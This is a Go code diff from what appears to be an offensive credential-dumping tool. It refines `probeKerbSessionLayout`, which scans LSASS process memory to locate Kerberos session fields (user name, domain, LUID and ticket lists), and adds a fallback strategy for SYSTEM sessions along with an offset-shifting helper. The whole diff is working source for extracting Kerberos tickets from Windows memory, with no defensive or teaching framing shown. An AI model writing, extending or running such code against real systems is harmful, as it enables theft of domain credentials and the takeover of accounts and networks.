@@ -45,6 +45,7 @@ func probeKerbSessionLayout(r lsassReader, sessionBase uintptr, base kerbSession
 		candidates = append(candidates, uniCandidate{off, length, bufPtr})
 	}
 
+	// Strategy 1: consecutive UserName+DomainName pair (most reliable)
 	for i := 0; i+1 < len(candidates); i++ {
 		a, b := candidates[i], candidates[i+1]
 		if b.off-a.off != 16 {
@@ -56,24 +57,39 @@ func probeKerbSessionLayout(r lsassReader, sessionBase uintptr, base kerbSession
 			continue
 		}
 
-		userOff := a.off
-		domOff := b.off
+		return adjustLayout(base, a.off, b.off)
+	}
 
-		ticketsBase := userOff + 0x58
-
-		adjusted := base
-		adjusted.Name = fmt.Sprintf("%s_probed_u%02X", base.Name, userOff)
-		adjusted.UserNameOff = userOff
-		adjusted.DomainOff = domOff
-		adjusted.Tickets1Off = ticketsBase
-		adjusted.Tickets2Off = ticketsBase + 0x10
-		adjusted.Tickets3Off = ticketsBase + 0x20
-		adjusted.NodeReadSize = ticketsBase + 0x38
-		if adjusted.NodeReadSize < base.NodeReadSize {
-			adjusted.NodeReadSize = base.NodeReadSize
+	// Strategy 2: single LSA_UNICODE_STRING match with valid remote string.
+	// SYSTEM sessions may have uninitialized DomainName — compute shift from
+	// the known UserName offset relative to the base layout.
+	for _, c := range candidates {
+		if c.off <= base.UserNameOff {
+			continue
 		}
-		return adjusted
+		str, sErr := readRemoteLSAUnicodeString(r, raw[c.off:c.off+16])
+		if sErr != nil || str == "" {
+			continue
+		}
+		return adjustLayout(base, c.off, c.off+16)
 	}
 
 	return base
+}
+
+func adjustLayout(base kerbSessionLayout, userOff, domOff int) kerbSessionLayout {
+	shift := userOff - base.UserNameOff
+	adjusted := base
+	adjusted.Name = fmt.Sprintf("%s_probed_u%02X", base.Name, userOff)
+	adjusted.LUIDOff = base.LUIDOff + shift
+	adjusted.UserNameOff = userOff
+	adjusted.DomainOff = domOff
+	adjusted.Tickets1Off = base.Tickets1Off + shift
+	adjusted.Tickets2Off = base.Tickets2Off + shift
+	adjusted.Tickets3Off = base.Tickets3Off + shift
+	adjusted.NodeReadSize = adjusted.Tickets3Off + 0x18
+	if adjusted.NodeReadSize < base.NodeReadSize {
+		adjusted.NodeReadSize = base.NodeReadSize
+	}
+	return adjusted
 }
